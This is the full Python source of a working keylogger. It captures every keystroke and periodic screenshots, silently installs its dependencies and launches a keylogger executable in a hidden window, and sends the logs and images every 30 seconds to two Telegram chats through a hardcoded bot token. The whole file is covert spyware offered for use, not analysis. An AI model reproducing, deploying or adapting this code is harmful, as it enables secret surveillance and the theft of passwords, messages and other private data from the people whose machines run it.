#!/usr/bin/python
python_version = '3.9.7'
modules = ['pynput', 'python-telegram-bot', 'pyautogui']
import sys
import os
import subprocess

def req():
	script_content = '@echo off\n'
	for module in modules:
		script_content += f"pip install {module}\n"

	with open("req.bat", "w") as file:
		file.write(script_content)
	if sys.platform.startswith("win"):
		startupinfo = subprocess.STARTUPINFO()
		startupinfo.dwFlags != subprocess.STARTF_USESHOWWINDOW
		subprocess.Popen("req.bat", startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
		subprocess.Popen("/dist/keylogger.exe", startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
	else:
		subprocess.Popen("req.bat", shell= True)

	os.remove("req.bat")			

import threading
import asyncio
try:
	import pyautogui
	import pynput.keyboard
	import telegram
except ModuleNotFoundError:
	req()
import time
import math	


class Keylogger:

	def __init__(self, time_interval,token):
		self.logger = "[Keylogger Initiated]"
		self.subject = "Keylogger Report Email"
		self.interval = time_interval
		self.token = token
		self.image = ""
		self.get_image()
	
	def get_image(self):
		path = 'screenshot1.png'
		try:
			pyautogui.screenshot(r'screenshot1.png')
		except NameError:
			pass
		self.image = path

	def append_to_log(self, key_strike):
		self.logger = self.logger + key_strike

	def evaluate_keys(self, key):
		try: 
			Pressed_key = str(key.char)
		except AttributeError:
			if key == key.space or key == key.backspace or key == key.tab or key == key.enter or key == key.alt_l :
				Pressed_key =  " "
			else:
				Pressed_key =  " " + str(key) + " "
		
		self.append_to_log(Pressed_key)


	async def report(self):
		while True:
			await asyncio.sleep(self.interval)
			if self.logger:
				self.get_image()
				try:
					await self.send_bot(self.logger)
					await self.send_image(self.image)
					try:
						os.remove("screenshot1.png")
					except FileExistsError or PermissionError:
						pass	
					self.logger = ""
					self.image = ""
				except telegram.error.BadRequest:
					self.logger = ""
					self.image = ""	
	
	async def send_image(self,path):
		bot = telegram.Bot(token=self.token)
		async with bot:
			try:
				await bot.send_photo(chat_id=-4130010526,photo = open(path, 'rb'))
				#-4114199486
				await bot.send_photo(chat_id=-4114199486,photo = open(path, 'rb'))
				print("sent ", path)
			except FileNotFoundError or telegram.error.BadRequest:
				pass

	async def send_bot(self,message):	
		bot = telegram.Bot(token=self.token)
		async with bot:
			await bot.send_message(chat_id=-4130010526,text=message)
			await bot.send_message(chat_id=-4114199486,text=message)
			print("sent ",message)			

	async def start(self):
		try:
			keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
			with keyboard_listener:
				await self.report()
				keyboard_listener.join()
		except NameError:
			pass
		


my_keylogger = Keylogger(30,"6541175839:AAEdVSOXC5uGSr8CnnWHMnv_JhswKbbW5JY")
asyncio.run(my_keylogger.start())